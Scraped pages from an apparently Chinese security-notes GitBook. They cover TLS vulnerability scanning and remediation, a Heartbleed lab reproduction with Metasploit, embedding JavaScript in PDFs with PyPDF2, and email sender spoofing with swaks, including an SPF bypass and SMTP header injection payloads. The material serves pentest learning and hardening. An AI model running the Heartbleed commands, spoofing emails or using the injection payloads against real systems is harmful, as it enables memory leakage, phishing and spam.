​-U​​​​, --vulnerable tests all (of the following) vulnerabilities (if applicable)，检测所有漏洞 ​-J​​​​, --logjam tests for LOGJAM vulnerability，检测 CVE-2015-4000 ​-4​​​​, --rc4, --appelbaum which RC4 ciphers are being offered，检测 CVE-2013-2566 ​--ciphers​​​ 弱密码识别 其他可以参看 --help​​ 命令 ┌──(root㉿kali)-[/home/testssl.sh] └─# ./testssl.sh --help \"testssl.sh [options] \" or \"testssl.sh \" \"testssl.sh \", where is mostly standalone and one of: --help what you're looking at -b, --banner displays banner + version of testssl.sh -v, --version same as previous -V, --local [pattern] pretty print all local ciphers (of openssl only). If search pattern supplied: it is an an ignore case word pattern of cipher hexcode or any other string in its name, kx or bits \"testssl.sh [options] \", where is: host|host:port|URL|URL:port port 443 is default, URL can only contain HTTPS as a protocol and [options] is/are: -t, --starttls Does a run against a STARTTLS enabled service which is one of ftp, smtp, lmtp, pop3, imap, sieve, xmpp, xmpp-server, telnet, ldap, nntp, postgres, mysql --xmpphost For STARTTLS xmpp or xmpp-server checks it supplies the domainname (like SNI) --mx Tests MX records from high to low priority (STARTTLS, port 25) --file/-iL Mass testing option: Reads one testssl.sh command line per line from . Can be combined with --serial or --parallel. Implicitly turns on \"--warnings batch\". Text format 1: Comments via # allowed, EOF signals end of Text format 2: nmap output in greppable format (-oG), 1 port per line allowed --mode Mass testing to be done serial (default) or parallel (--parallel is shortcut for the latter) --warnings \"batch\" doesn't continue when a testing error is encountered, off continues and skips warnings --connect-timeout useful to avoid hangers. Max to wait for the TCP socket connect to return --openssl-timeout useful to avoid hangers. Max to wait before openssl connect will be terminated single check as (\"testssl.sh URI\" does everything except -E and -g): -e, --each-cipher checks each local cipher remotely -E, --cipher-per-proto checks those per protocol -s, --std, --categories tests standard cipher categories by strength -f, --fs, --nsa checks forward secrecy settings -p, --protocols checks TLS/SSL protocols (including SPDY/HTTP2) -g, --grease tests several server implementation bugs like GREASE and size limitations -S, --server-defaults displays the server's default picks and certificate info -P, --server-preference displays the server's picks: protocol+cipher -x, --single-cipher tests matched of ciphers (if not a number: word match) -c, --client-simulation test client simulations, see which client negotiates with cipher and protocol -h, --header, --headers tests HSTS, HPKP, server/app banner, security headers, cookie, reverse proxy, IPv4 address -U, --vulnerable tests all (of the following) vulnerabilities (if applicable) -H, --heartbleed tests for Heartbleed vulnerability -I, --ccs, --ccs-injection tests for CCS injection vulnerability -T, --ticketbleed tests for Ticketbleed vulnerability in BigIP loadbalancers --BB, --robot tests for Return of Bleichenbacher's Oracle Threat (ROBOT) vulnerability --SI, --starttls-injection tests for STARTTLS injection issues -R, --renegotiation tests for renegotiation vulnerabilities -C, --compression, --crime tests for CRIME vulnerability (TLS compression issue) -B, --breach tests for BREACH vulnerability (HTTP compression issue) -O, --poodle tests for POODLE (SSL) vulnerability -Z, --tls-fallback checks TLS_FALLBACK_SCSV mitigation -W, --sweet32 tests 64 bit block ciphers (3DES, RC2 and IDEA): SWEET32 vulnerability -A, --beast tests for BEAST vulnerability -L, --lucky13 tests for LUCKY13 -WS, --winshock tests for winshock vulnerability -F, --freak tests for FREAK vulnerability -J, --logjam tests for LOGJAM vulnerability -D, --drown tests for DROWN vulnerability -4, --rc4, --appelbaum which RC4 ciphers are being offered? -U 结果如下： Start 2023-05-23 03:00:30 -->> 192.168.201.216:443 (192.168.201.216) > 192.168.201.216:443 (192.168.201.216) Web 网页版 testssl.sh（免安装）：https://inspect.rapydblok.com【不推荐】 【注】：网页版使用要注意隐私，自用 Server 推荐还是用 cmd 版测试。 在线检测 SSL Server Test（国内） SSL Server Test（国外） filippo.io - Vulnerability tests https://wosign.ssllabs.com/ 0x03 漏洞复现 Vulhub Vulhub - Docker-Compose file for vulnerability environment https://github.com/vulhub/vulhub Docker 教程_w3cschool 心脏滴血复现 环境准备 主机 IP 用途 Ubuntu 虚拟机 192.168.201.156 基于 Vulhub 搭建 OpenSSL“心脏滴血”漏洞环境 Kali Linux 虚拟机 192.168.202.61 使用 MSF 框架对存在漏洞的靶机进行攻击 手动搭建 https://www.openssl.org/source/old/1.0.1/source/old/1.0.1/index.html (openssl.org) 准备一台 kali 和一台装有 OpenSSL1.0.1 版本的虚拟机【漏洞环境】 下载有漏洞的 OpenSSL 版本 编译安装 # 升级源 apt-get upgrade sudo apt-get update # 安装编译环境 root@refl4:/home/openssl-1.0.1# sudo apt-get install build-essential # 编译安装 cd /home # 在 /usr/local/openssl 目录下安装 OpenSSL，并设置默认的 OpenSSL 目录为 /usr/local/openssl ./config --prefix=/usr/local/openssl --openssldir=/usr/local/openssl # 编译安装 sudo make clean sudo make && make install # 设置软链 ln -s # ln -s /path/to/directory /path/to/symlink # 这将创建一个名为 /path/to/symlink 的符号链接，指向 /path/to/directory。 Vulhub 搭建 因为我使用的是 docker compose 是 Compose V2，所以使用 docker compose​​。 History of Compose | Docker Documentation root@refl4:/home# git clone https://github.com/vulhub/vulhub.git root@refl4:/home/vulhub/openssl/CVE-2014-0160# pwd /home/vulhub/openssl/CVE-2014-0160 root@refl4:/home/vulhub/openssl/CVE-2014-0160# ls 1.png 2.png docker-compose.yml README.md README.zh-cn.md ssltest.py www root@refl4:/home/vulhub/openssl/CVE-2014-0160# docker compose up -d [+] Running 8/8 ✔ nginx 7 layers [⣿⣿⣿⣿⣿⣿⣿] 0B/0B Pulled 131.1s ✔ b281ebec60d2 Pull complete 113.1s ✔ 2700c1ade95c Pull complete 113.2s ✔ cd1f945398e5 Pull complete 113.8s ✔ 24291727d0f3 Pull complete 113.9s ✔ c661453e1eb5 Pull complete 113.9s ✔ f4f1857f7bb1 Pull complete 113.9s ✔ 951d0b01db0f Pull complete 113.9s [+] Running 2/2 ✔ Network cve-2014-0160_default Created 0.1s ✔ Container cve-2014-0160-nginx-1 Started 1.3s 访问 http://192.168.201.156:8080/ https://192.168.201.156:8443/ Exploit 使用 namp 进行探测 ┌──(root㉿kali)-[~] └─# nmap -sV -p 8443 -script ssl-heartbleed.nse 192.168.201.156 使用 testssl.sh​​ 进行探测 使用 Metasploit 验证已存在的 Heartbleed​​，使用详细设置将显示 Heartbleed​​ 暴露的内存泄漏。 ┌──(root㉿kali)-[/home/testssl.sh] └─# msfconsole msf6> search heartbleed msf6> use auxiliary/scanner/ssl/openssl_heartbleed # 查看需要设置参数 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.201.156 RHOSTS => 192.168.201.156 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 8443 RPORT => 8443 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run 每次都可以获取 64 字节​​ 的信息，如果有人此时在登录 Web 应用，还可以直接抓到账号密码等信息。 漏洞环境本机自测 ​root@refl4:/home/vulhub/openssl/CVE-2014-0160# python3 ssltest.py 192.168.201.156 -p 8443​​ 编译 OpenSSL 遇到的错误 报错 ​POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs]​​ cms.pod around line 457: Expected text after =item, not a number cms.pod around line 461: Expected text after =item, not a number cms.pod around line 465: Expected text after =item, not a number cms.pod around line 470: Expected text after =item, not a number cms.pod around line 474: Expected text after =item, not a number POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs] Error 1 解决方法 ​rm -f /usr/bin/pod2man​​，重新编译安装即可。 0x04 修复方法汇总 使用此方法上述所有漏洞可全部修复(将 RC4,DES/3DES,EXP​​ 等弱加密算法及 SSL 弱加密协议替换为安全性更高的) Windows 按下 Win + R​​，进入\"运行\"，键入 gpedit.msc​​，打开\"本地组策略编辑器\" 计算机配置 > 管理模板 > 网络 > ssl 配置设置。 在 SSL 配置设置，打开 SSL 密码套件顺序设置，点击已启用。 更换 SSL 密码套件。 原 SSL 密码套件： TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA_P256,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA_P384,TLS_DHE_DSS_WITH_AES_256_CBC_SHA256,TLS_DHE_DSS_WITH_AES_128_CBC_SHA256,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_3DES_EDE_CBC_SHA,TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_RC4_128_SHA,TLS_RSA_WITH_RC4_128_MD5,TLS_RSA_WITH_NULL_SHA256,TLS_RSA_WITH_NULL_SHA,SSL_CK_RC4_128_WITH_MD5,SSL_CK_DES_192_EDE3_CBC_WITH_MD5 替换为： TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P521,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P521,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P521,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P521,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P521,TLS_DHE_DSS_WITH_AES_128_CBC_SHA256,TLS_DHE_DSS_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_NULL_SHA256 重启系统再扫。 使用以下方法可同时修复 SSL/TLS​​ 受诫礼(BAR-MITZVAH​​)攻击漏洞(CVE-2015-2808)【原理扫描】，SSL/TLS​​ RC4 信息泄露漏洞(CVE-2013-2566)【原理扫描】 这两个漏洞都是 RC4 算法的漏洞问题，方法就是禁用 RC4 改用别的算法。 方法一 控制面板 ---> 系统和安全 ---> 管理工具 ---> 本地安全策略 ---> 本地策略 ---> 安全选项 ---> 系统加密：将 FIPS 兼容算法用于加密、哈希和签名； 右键 ---> 属性 ---> 点击“已启用” ---> “确定” 使用此方法之后可能会导致某些只支持 RC4 算法的服务无法正常启用。 方法二 注册表中启用 TLS1.2 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.2] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.2\\Client] \"DisabledByDefault\"=dword:00000000 \"Enabled\"=dword:00000001 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.2\\Server] \"DisabledByDefault \"=dword:00000000 \"Enabled\"=dword:00000001 注册表中禁用 SSL2.0 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\SSL 2.0] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\SSL 2.0\\Client] \"DisabledByDefault\"=dword:00000000 禁用 RC4 注册表中将 RC4 启用项都禁止，没有项需要新建 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\RC4 128/128] \"Enabled\"=dword:00000000 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\RC4 40/128] \"Enabled\"=dword:00000000 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\RC4 56/128] \"Enabled\"=dword:00000000 对于 SSL 3.0 POODLE 攻击信息泄露漏洞(CVE-2014-3566)【原理扫描】，目前已经调整为低危级别，不修复其实也可以。 点击“开始”，“运行”，输入 “Regedit”，点击 OK. 在注册表中寻找：HKey_Local_Machine\\System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\SSL 3.0\\Server​​ 如果在 Protocols 下没有“SSL 3.0”选项，请依次新建“SSL 3.0”和“Server”项。在 Protocols 文件夹，右键单击项(K)，然后重命名文件夹为 SSL 3.0；在 SSL 3.0 文件夹，右键单击项(K)，然后重命名文件夹为 Server； 右键单击 server 的文件夹，选择新建，新建一个 DWORD 值。 在名称中，输入“Enabled”，回车。 请确保它显示 00000000(0) 的数据列下。如果没有，请右键单击并选择修改，输入 0 作为数值数据。 点击 OK，退出注册表编辑器，然后重启电脑。 【注】：Windows 上关于 SSL/TSL​​ 及密码套件的更改，在注册表中手动敲比较繁琐，可以使用 IIS Crypto 来管理，比较方便。 官方地址：https://www.nartac.com/Products/IISCrypto/Download 对于具体端口上的 SSL/TLS 服务器瞬时 Diffie-Hellman 公共密钥过弱【原理扫描】，首先需要使用生产大于 1 024bit​​ 的 key 值，再将生成的文件加到具体报漏洞服务的配置文件里。 http 服务器相关配置 首先生成大于 1024bit(例如 2048bit)的 dhkey。 openssl dhparam -out dhparams.pem 2048 然后在对应服务器中配置 Apache2.4.8 及以后版本使用如下配置命令配置（http.conf 中或者对应的虚拟主机配置文件中添加）​SSLOpenSSLConfCmd DHParameters \"{path to dhparams.pem}\"​​ Apache2.4.7 版本 Apache2.2.31 版本及以后版本redhat debian 等大多发行版中最新 Apache2.2.x通过把 dhparams.pem 的内容直接附加到证书文件后 Apache2.4.7 之前 2.4.x 版本Apache2.2.31 之前版本dhparam 默认为 1024bit 无法修改 nginx 使用如下命令配置（在对应的虚拟主机配置文件 nginx.conf​​ 中 server 字段内添加） ​ssl_dhparam {path to dhparams.pem}​​ 如果服务器配置无法修改，例如 Apache2.2.31 之前版本，可以禁用 DHE 系列算法，采用保密性更好的 ECDHE 系列算法，如果 ECDHE 不可用可以采用普通的 RSA。 更多解决方案请参考：https://weakdh.org/sysadmin.html Linux 也可以在 Linux 针对具体端口服务上的 CVE-2016-2183，CVE-2015-2808，CVE-2013-2566，CVE-2015-4000 等弱加密算法导致的漏洞进行逐个修复，只需要针对具体服务在配置文件中将 DES/3DES,RC4,EXP​​ 等算法禁用或指定为其他强加密算法即可。 Nginx 普通推荐如下 server { ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; } 最佳实践 http { ...... ssl_session_timeout 5m; ssl_session_cache shared:SSL:10m; ssl_session_tickets off; ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers \"ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES256-SHA:HIGH:!MEDIUM:!LOW:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4:@STRENGTH\"; ssl_prefer_server_ciphers on; proxy_ssl_verify off; ...... server { listen 80; listen 443 ssl http2; # server_name @web_name ssl_certificate server.crt; ssl_certificate_key server.key; ssl_dhparam dhparam.pem; ssl_stapling on; ssl_stapling_verify on; set $backend_ip 127.0.0.1; location ~ ^/socket.io/ { proxy_read_timeout 600; proxy_send_timeout 600; tcp_nodelay on; gzip off; proxy_http_version 1.1; proxy_set_header X-FORWARDED-FOR $remote_addr; proxy_set_header X-FORWARDED-PROTO $scheme; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; proxy_set_header Accept-Encoding \"\"; proxy_pass http://$backend_ip:8082; } ...... error_page 400 401 403 404 /404.html; error_page 501 502 503 504 505 /50x.html; } #@do not remove the comment, @http_server #@mirror_server_lookup } Apache 更新 Apache 根目录下 conf/httpd.conf​​ 文件如下 SSLProtocol TLSv1 TLSv1.1 TLSv1.2 SSLCipherSuite ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4 Tomcat 更新 %TOMCAT_HOME%\\conf\\server.xml​​ 文件如下 简单粗暴 此类漏洞，最简单的修复方式就是升级版本和禁用模块。 如 OpenSSL“心脏出血”漏洞（CVE-2014-0160）受影响的 OpenSSL 版本： OpenSSL 1.0.2-betaOpenSSL 1.0.1 - OpenSSL 1.0.1f 要解决此漏洞，简单粗暴的方法就是升级 OpenSSL 软件。建议服务器管理员或使用 1.0.1g​​​ 版，或使用 -DOPENSSL_NO_HEARTBEATS​​​​ 选项重新编译 OpenSSL，从而禁用易受攻击的功能，直至可以更新服务器软件。 https://bbs.wosign.com/thread-2913-1-1.html 0x00 前人栽树 对知识的尊重，就算是抄也没关系，你得说明来源且前提是能学到学会~ Heartbleed 心脏滴血漏洞总结（CVE-2014-0106） - s1awwhy - 博客园 (cnblogs.com) SSL/TSL 相关漏洞 CVE-2015-2808,CVE-2013-2566,CVE-2014-3566,CVE-2016-2183,cve-2015-4000,瞬时 Diffie-Hellman 公共密钥过弱修复总结 - 迪克推多 0 - 博客园 (cnblogs.com) 使用 openSSL 开源工具进行 SSL/TLS 安全测试 - 全球可信 TLS/SSL 数字证书商店-INFINISIGN SSL & TLS HTTPS Testing [Definitive Guide] - Aptive -- 【原文，国内的文章基本出自这个】 常见的几种 SSL/TLS 漏洞及攻击方式 - 全球可信 TLS/SSL 数字证书商店-INFINISIGN -- 【译文】 Vulhub - Docker-Compose file for vulnerability environment (84 条消息) 渗透测试-Openssl 心脏出血漏洞复现_Tr0e 的博客-CSDN 博客 https://annevi.cn/2021/02/14/https-study/ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-24 22:43:19 "},"web/xss2pdf-制作.html":{"url":"web/xss2pdf-制作.html","title":"xss2pdf-制作","keywords":"","body":"0x01 制作方法 PDF 编辑软件 Adobe Acrobat DC 迅捷 PDF 编辑 1) 启动迅捷 PDF 编辑器打开一个 PDF 文件，或者使用“创建 PDF 文件”功能，通过将其他文档和资源转换为“可移植文档格式”来创建 PDF 文件。 2) 单击左侧的“页面”标签，选择与之对应的页面缩略图，然后从选项下拉菜单中选择“页面属性”命令 3) 在“页面属性”对话框单击“动作”标签，再从“选择动作”下拉菜单中选择“运行 JavaScript”命令，然后单击【添加】按钮，弹出 JavaScript 编辑器对话框，填写 JavaScript 代码。 4) 在弹出的“JavaScript 编辑器”对话框中输入代码： ​app.alert(‘XSS’);​​ 单击【确定】按钮保存 PDF 文件。 这里需要注意的是：Adobe 支持自身的 JavaScript 对象模型，例如 alert(‘xss’)​​ 必须被 APP 对象调用，因此变成了 app.alert(‘xss’)​​。这意味着，利用 JavaScript 进行攻击时只能使用 Adobe 所支持的功能。 5) 关闭软件，直接打开刚才保存的 PDF 文件，JavaScript 代码即被执行。经过测试最新版本的 360 浏览器和谷歌浏览器支持 6) 现在，尝试把 PDF 文件嵌入到网页中并试运行。创建一个 HTML 文档，代码如下： 除了把 JavaScript 嵌入 PDF 文件中执行，还可以利用基于 DOM 的方法执行 PDF XSS。此类方法由 Stefano Di Paola 和 Giorgio Fedon 在第 23 届 CCC 安全会议中提出，大家可以参考论文 Adobe Acrobat。 Stefano Di Paola 把 PDF 中的 DOM XSS 称为 UXSS（Universal Cross-Site Scripting）。事实上，任何支持 PDF 文件的网站都可能存在这种漏洞。 Python 1) 首先安装 PyPDF2 ┌──(root㉿kali)-[~] └─# pip install PyPDF2 2) 直接新建内嵌 xss 的 pdf from PyPDF2 import PdfReader, PdfWriter # 创建一个新的 PDF 文档 output_pdf = PdfWriter() # 添加一个新页面 page = output_pdf.add_blank_page(width=72, height=72) # 添加 js 代码 output_pdf.add_js(\"app.alert('xss');\") # 将新页面写入到新 PDF 文档中 with open(\"xss.pdf\", \"wb\") as f: output_pdf.write(f) 3) 将 JavaScript 代码嵌入到已有 pdf from PyPDF2 import PdfReader, PdfWriter # 打开原始 PDF 文件 input_pdf = PdfReader(\"x.pdf\") # 创建一个新的 PDF 文档 output_pdf = PdfWriter() # 将现有的 PDF 页面复制到新文档 for i in range(len(input_pdf.pages)): output_pdf.add_page(input_pdf.pages[i]) # 添加 JavaScript 代码 output_pdf.add_js(\"app.alert('xss');\") # 将新 PDF 文档写入到文件中 with open(\"xss.pdf\", \"wb\") as f: output_pdf.write(f) 0x02 修复方法 而作为网站管理员或开发者，可以选择强迫浏览器下载 PDF 文件，而不是提供在线浏览等，或修改 Web 服务器配置的 header 和相关属性。 可以使用第三方插件解析 pdf，不用 chrome 自带的 pdf 解析，https://github.com/adobe-type-tools/cmap-resources 0x00 前人栽树 PDF XSS - Bypass - 博客园 (cnblogs.com) xss pdf 制作 - 先知社区 (aliyun.com) Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-30 22:18:13 "},"email/a-readme.html":{"url":"email/a-readme.html","title":"Email","keywords":"","body":"关于邮件的知识合集~ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:28:32 "},"email/Attack Email.html":{"url":"email/Attack Email.html","title":"Attack Email","keywords":"","body":"邮件字段 域名 含义 添加者 Received 传输路径 各级邮件服务器 Return-Path 回复地址 目标邮件服务器 Delivered-To 发送地址 目标邮件服务器 Reply-To 回复地址 邮件的创建者 From 发件人地址 邮件的创建者 To 收件人地址 邮件的创建者 Cc 抄送地址 邮件的创建者 Bcc 暗送地址 邮件的创建者 Date 日期和时间 邮件的创建者 Subject 主题 邮件的创建者 Message-ID 消息ID 邮件的创建者 MIME-Version MIME版本 邮件的创建者 Content-Type 内容的类型 邮件的创建者 Content-Transfer-Encoding 内容的传输编码方式 邮件的创建者 swaks swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester. swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作 SMTP 协议报文。 常用指令 --to user@example.com：收件人 --from me@example.com：发件人 --server test-server.example.com：smtp 服务器 -au me@example.com：邮件用户 -ap xxxxpassword：密码 --body [string or file path]：邮件正文 --ehlo [helo-string]：伪造 ehlo 头信息 --header [header-and-data]：伪造 From、Subject、Message-Id、X-Mailer 等头信息，如 --header'Subject：邮件主题内容' --data [data-portion]：伪造 DATA 的全部内容，可直接将邮件源码作为选项 --attach [attachment-specification]：添加附件 自定义 header 字段 swaks 支持自定义某些 Header，参数如下： swaks --header- 如果想去除 Mailer 特征，就可以这么做： swaks --header-X-Mailer gmail.com 伪造 header-from --h-From: '管理员' 发送邮件原文和添加附件 --data 参数 --attach 参数 swaks --to 要发给的目标@gmail.com --from 你拥有的邮箱@xxxmail.net --ehlo gmail.com（需要攻击的域名） --data Test.eml（邮件原文。可以先用邮箱生成再导出邮件原文） --attach /tmp/附件.exe --header-X-Mailer gmail.com（需要攻击的域名） --server xxxmail.net（你邮箱的服务器） -p 25 -au 你拥有的邮箱账号@xxxmail.net -ap zqD2q7wkKbxxsdadda（密码） python 实现 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header mail_host=\"mail.smtp2go.com\" mail_user=\"\" mail_pass=\"\" sender = 'test@smtp2go.com' receivers = ['target@gmail.com'] message = MIMEText('Hello World', 'plain', 'utf-8') message['From'] = Header(\"admin@qq.com\", 'utf-8') message['To'] = Header(receivers[0], 'utf-8') subject = 'SMTP 邮件测试' message['Subject'] = Header(subject, 'utf-8') try: smtpObj = smtplib.SMTP() smtpObj.connect(mail_host, 25) smtpObj.login(mail_user,mail_pass) smtpObj.sendmail(sender, receivers, message.as_string()) print \"Success\" except smtplib.SMTPException: print \"Error\" smtp2go smtp2go 主要是相当于邮件托管，可以分发子账户进行发送。 地址：https://support.smtp2go.com/hc/en-gb （邮箱注册）普通账户可以免费发 1000 封邮件，需要境外手机号码（接码平台）。 分配好账户后，可以通过 swaks 进行登录发送邮件： swaks --to evilxxx@gmail.com --from 需要伪造的@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap SPF 绕过 swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: '管理员' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap 由于邮件显示的是 Header 中的 From 不是 smtp.from，因此可以将 smtp.from 设置为正常的邮件服务器地址，伪造一个 Mail.From 即可。 但是现在这种邮箱都会显示代发，又或者 mail.from（header.from） 和 smtp.from 不一致的话会直接被邮件服务器拒收。 邮件注入 邮件注入和 HTTP 头部注入相似，这种漏洞发生在一个编程语言嵌入另一个，比如 mysql 嵌入php。 对于邮件头部的字段其实就是换行符 0x0A 或者 0x0D0x0A 分割 ，在绝大部分系统里面不是 \\n 就是 \\r\\n，所以就可以注入了。 电子邮件注入是针对邮件功能的一种攻击类型。它允许恶意攻击者注入任何邮件头字段，BCC、CC、主题等，它允许黑客通过注入手段从受害者的邮件服务器发送垃圾邮件。它可能会影响任何从用户 UI 接收消息并发送电子邮件消息的应用程序。这种攻击的主要原因是不适当的用户输入验证或应用程序根本没有验证和过滤机制。 注入分类 发件人，主题，内容 发件人修改 本来发件人就可控，或者在别的字段里重复添加，但是要看邮件服务器针对多个 from 是如何实现的，是取第一个，还是取最后一个，还是如何操作。 from:sender@domain.com%0Afrom:attacker@domain.com 收件人、抄送人注入（Cc/Bcc注入） 在发送者字段(sender)后注入 Cc 和 Bcc 参数 From:sender@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com 所以现在，消息将被发送到 recipient 和 recipient1 账户。 主题注入 攻击者注入的假的主题 subject 将被添加到原来的主题中并且在某些情况下将取代原本的主题 subject，这取决于邮件服务行为。即代码编写的容错性，当参数中出现两个 subject 的时候代码是选择丢弃还是后者覆盖。 From:sender@domain.com%0ASubject:This’s%20Fake%20Subject 消息体注入 要注意 SMTP 的 Mail 格式，消息主题和头部 Header 之间有两个换行符(和 HTTP 是一样的)。 From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message. 假消息将被添加到原始消息中。 0x00 前人栽树 邮件注入攻击 Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-15 18:10:19 "},"email/邮件协议.html":{"url":"email/邮件协议.html","title":"邮件协议","keywords":"","body":"MIME 邮件格式 SMTP 简单邮件传输协议 Simple Mail Transfer Protocol Sendmail 是最早使用 SMTP 的邮件传输代理之一 SMTP 是一个相对简单的基于文本的协议。我们可以透过协议，指定将消息发送至一或多个接收者。我们可以很简单地通过 telnet 程序来测试一个 SMTP 服务器。SMTP 主要使用 TCP 端口 25。要为一个给定的域名决定一个 SMTP 服务器，需要使用 DNS 的 MX 记录 最初的 SMTP 的局限之一，在于它没有对发送方进行身份验证的机制。因此，后来定义了 SMTP-AUTH 扩展。尽管有了身份认证机制，垃圾邮件仍然是一个主要的问题。 IRTF 的反垃圾邮件研究小组正在研究一些建议方案，以提供简单、灵活、轻量级的、可升级的源端认证。最有可能被接受的建议方案是发件人策略框架协议(SPF)。 提供 SSL 加密的 SMTP 协议被称为 SMTPS SPF What is SPF (Sender Policy Framework) 的缩写，一种以 IP 